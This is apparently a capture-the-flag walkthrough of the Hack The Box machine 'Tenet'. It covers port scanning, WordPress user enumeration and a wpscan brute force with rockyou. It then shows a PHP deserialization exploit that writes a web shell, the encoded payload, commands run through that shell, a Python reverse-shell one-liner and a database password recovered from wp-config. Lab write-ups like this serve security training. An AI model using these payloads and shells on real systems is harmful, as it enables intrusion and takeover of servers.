# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo=
|   256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt

80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tenet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

* port 80 --> Default Apache2 page.* 

## http://10.10.10.223/users.txt

![image](https://user-images.githubusercontent.com/68326057/116828371-ec805700-abbb-11eb-8f27-c019bffbac32.png)

## CMS - WordPress

![image](https://user-images.githubusercontent.com/68326057/116828423-24879a00-abbc-11eb-86c9-be34ca3e7a4a.png)

![image](https://user-images.githubusercontent.com/68326057/116828426-2b161180-abbc-11eb-8bdd-22a7251fbe95.png)

**Username:neil**

## wpscan

![image](https://user-images.githubusercontent.com/68326057/116828535-f060a900-abbc-11eb-8ebb-8a7411c5dd4c.png)

 BUT
 
 ![image](https://user-images.githubusercontent.com/68326057/116828622-741a9580-abbd-11eb-88a5-2cd66e7d22f7.png)

Another user

![image](https://user-images.githubusercontent.com/68326057/116828663-b80d9a80-abbd-11eb-879f-a2bc0c755bef.png)

**Username : protagonist**

outdated Version:- 

![image](https://user-images.githubusercontent.com/68326057/116828688-dffcfe00-abbd-11eb-947a-12366a210904.png)

```bash
wpscan --url http://tenet.htb/wp-login.php -U user.txt -P ../../rockyou.txt 
```
```bash
Found sator.php
```
![image](https://user-images.githubusercontent.com/68326057/116828883-361e7100-abbf-11eb-8efd-e9c06927cbfd.png)


# Deserlization attack

1. Downloaded sator.php.bak

```php
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```
```php
<?php

class DatabaseExport
{
        public $user_file='reverseshell.php';
        public $data='<?php system($_GET["cmd"]); ?>';
}

$test= serialize(new DatabaseExport);
echo $test;

?>
``
## After deserializing

```bash
O:14:"DatabaseExport":2:{s:9:"user_file";s:16:"reverseshell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

--> Use This site : https://www.urlencoder.org/

```url
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A16%3A%22reverseshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A30%3A%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D
```
# user - wwwdata

```bash
http://10.10.10.223/shell.php?cmd=whoami
```

![image](https://user-images.githubusercontent.com/68326057/116829565-02911600-abc2-11eb-870e-44bbbcb7ecbb.png)

```bash
http://10.10.10.223/shell.php?cmd=python3%20-V
```

![image](https://user-images.githubusercontent.com/68326057/116829621-4552ee00-abc2-11eb-96d5-f4d9ec6e9f22.png)

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## wp-config.php

![image](https://user-images.githubusercontent.com/68326057/116829686-cc07cb00-abc2-11eb-8748-92ad7cd6cca1.png)

```bash
neil:Opera2112 
```

![image](https://user-images.githubusercontent.com/68326057/116829722-0a04ef00-abc3-11eb-90e5-78b8b040199c.png)


# user -neil

--> ssh neil@tenet.htb

## sudo -l

![image](https://user-images.githubusercontent.com/68326057/116829834-d9718500-abc3-11eb-940c-6ce8f6906bec.png)

## kernel exploit

![image](https://user-images.githubusercontent.com/68326057/116829902-46851a80-abc4-11eb-9fd1-fcef3b4eb990.png)

![image](https://user-images.githubusercontent.com/68326057/116829916-5dc40800-abc4-11eb-95fe-60982c59e7a6.png)
